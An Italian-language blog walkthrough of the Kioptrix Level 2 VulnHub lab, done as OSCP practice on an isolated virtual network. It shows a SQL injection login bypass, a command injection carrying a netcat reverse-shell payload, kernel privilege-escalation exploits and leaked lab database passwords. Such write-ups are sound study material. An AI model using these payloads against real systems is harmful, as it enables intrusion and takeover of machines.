---
layout: post
title: "Getting Root: Kioptrix livello 2"
exercise: https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
level: SEMPLICE
promotion: 
modified: 
featured: false
category: [getting-root]
tags: [walkthrough, oscp, kioptrix, getting-root]
comments: true
share: true
---

Il secondo livello di Kioptrix non presenta particolari difficoltà. Fa parte di
quelle macchine che sto usando per ricostruire l'autostima in vista della
prossima OSCP.

## Kioptrix Livello 2

Continuiamo la serie Kioptrix ed arriviamo al livello 2 disponibile
[qui]({{page.exercise}}).

Anche questa macchina virtuale è un box Linux su cui è montata una
distribuzione CentOS obsoleta.

### Setup dell'ambiente

Per iniziare, ho scaricato la [versione corretta della macchina
virtuale](http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar). La prima versione
aveva infatti un bug nella web application. Ho lasciato configurato
[VirtualBox](https://www.virtualbox.org) affinché esegua la mia [Kali
Linux](https://www.kali.org) e la macchina target in una rete ad hoc, isolata
dal mondo esterno.

Questo si ottiene andando sulle preferenze di Virtual Box, selezionando
_Network_ ed il tab _Host-only networks_.

![Impostazioni Virtual Box]({{site.url}}/assets/images/getting-root/k1/impostazioni_virtualbox.png)

Ora che tutte le macchine, all'avvio, prenderanno un indirizzo sulla 192.168.56
possiamo partire.

La macchina 192.168.56.101 è una Kali Linux aggiornata e pronta all'uso.
La macchina 192.168.56.103 è il nostro target.

![La nostra vittima all'avvio]({{site.url}}/assets/images/getting-root/k2/target.png)

### Recon

Il primo passaggio è quello di enumerare i servizi in ascolto sulla macchina,
per cercare di capire qualcosa in più.

{%highlight sh%}
# nmap -sV -O 192.168.56.103 -oA 192.168.56.103
{%endhighlight%}

{% highlight sh %}
# Nmap 7.50 scan initiated Mon Sep 11 17:28:58 2017 as: nmap -sV -O -oA 192.168.56.103 192.168.56.103
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.103
Host is up (0.00024s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 08:00:27:87:1E:A6 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 11 17:29:14 2017 -- 1 IP address (1 host up) scanned in 16.05 seconds
{%endhighlight%}

E' stato lanciato anche un _dirb_, che però non ha trovato cose interessanti.

### Takeover narrative

Cercando con _searchexploit_, qualche exploit già pronto per le versioni
rilevate abbiamo che per CUPS c'è qualcosa che possa darmi una shell, mentre
per Apache solamente un DoS.

Navigando sulla porta 80, ci viene presentato una maschera di login di uno
pseudo portale amministrativo.

![Login]({{site.url}}/assets/images/getting-root/k2/login_page_sulla_porta_80.png)

La pagina di login era facilmente bypassabile usando la combinazione di
credenziali _admin:foo or '1'='1_.

![Login page bypassed]({{site.url}}/assets/images/getting-root/k2/login_page_bypassed.png)

Una volta autenticati, ci viene presentata una maschera che ci permette di
eseguire un ping su un indirizzo ip passato come parametro. Questo genere di
funzionalità si presta spesso a problematiche di command injection, quando
l'input non è validato correttamente.

Infatti, usando il carattere ';' come separatore, siamo in grado di far
eseguire il comando _id_.

![Command injection]({{site.url}}/assets/images/getting-root/k2/command_injection.png)

Una shell non privilegiata sulla macchina fa sempre comodo come primo
risultato, che ne pensate? 

Bene, su una finestra di terminale, ho lanciato netcat in ascolto sulla porta 443 e poi ho cercato di fare una callback alla mia macchina.

{%highlight sh%}
$ nc -lvnp 443
{%endhighlight%}

Perché uso la 443? Preferisco usare porte di servizi conosciuti, per evitare
problemi con eventuali firewall. Servizi come 21, 53, 80, 443 in uscita da un
indirizzo IP,  possono essere dei buoni candidati.

Dopo un po' di tentativi di indovinare il path di netcat, sulla macchina
target, sono riuscito ad ottenere la mia shell col comando _192.168.56.101; /usr/local/bin/nc 192.168.56.101 443 -e /bin/sh_

![Reverse shell]({{site.url}}/assets/images/getting-root/k2/unprivileged_reverse_shell.png)

Da dentro, il primo obiettivo è capire bene di quale distribuzione si sta
parlando e soprattutto quale la versione del kernel. Questo ci permette in
seguito di cercare l'exploit migliore per elevare i privilegi della nostra
shell.

![CentOS disclosure]({{site.url}}/assets/images/getting-root/k2/centos_disclosure.png)
{%highlight sh%}

$ uname -a

Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux

$ lsb_release -a
LSB Version:	:core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID:	CentOS
Description:	CentOS release 4.5 (Final)
Release:	4.5
Codename:	Final
{%endhighlight%}

Cerco quindi exploit per CentOS 4.5 e sono abbastanza fortunato.
![CentOS exploit]({{site.url}}/assets/images/getting-root/k2/centos_exploit.png)

Visto che le macchine, per come è stato creato il mini laboratorio, non escono
su Internet direttamente, carico gli exlploit nella mia _/var/www/html_ e
usando wget li prelevo dal target.

Provo prima l'exploit per il CVE-2009-2698 ma, una volta caricato fallisce.
Niente shell di root al primo tentativo.

![CVE-2009-2698 failed]({{site.url}}/assets/images/getting-root/k2/exploit_1_failed.png)

Provo quindi con l'exploit per il CVE-2009-2692 e questa volta, dopo aver compilato e lanciato l'exploit ho più fortuna: sono root.

![CVE-2009-2692 succeded]({{site.url}}/assets/images/getting-root/k2/root.png)

Ho cercato un po' in lungo ed in largo la flag di questa macchina ma non l'ho
trovata. Probabilmente l'autore non l'ha messa. 

### Spinoff

Andando a vedere il codice sorgente di /var/www/html/index.php è possibile ottenere la password di MySQL dell'utente john.

![index.php info disclosure]({{site.url}}/assets/images/getting-root/k2/mysql_info_disclosure.png)

![MySQL connected as john]({{site.url}}/assets/images/getting-root/k2/mysql_connected_john.png)

E connettersi con successo al database MySQL.

![MySQL connected as john]({{site.url}}/assets/images/getting-root/k2/mysql_0.png)

Andando più a fondo è stato possibile trovare le hash delle password degli
utenti del piccolo portale.

![Application hashes]({{site.url}}/assets/images/getting-root/k2/mysql_1_hash_exposed.png)

Ed infine è stato possibile risalire alla password di root su MySQL che è
_hiroshima_.

![MySQL pwd disclosure]({{site.url}}/assets/images/getting-root/k2/mysql_2_mysql_pwd_exposure.png)



## Off by one

Anche questo livello 2 di Kioptrix non ha presentato grosse difficoltà. Resta
il punto aperto del perché l'exploit per il CVE-2009-2698 non abbia funzionato,
ma non ho investigato nel dettaglio, visto lo scopo di queste esercitazioni.

Il livello 3 di Kioptrix mi aspetta.

Enjoy it!
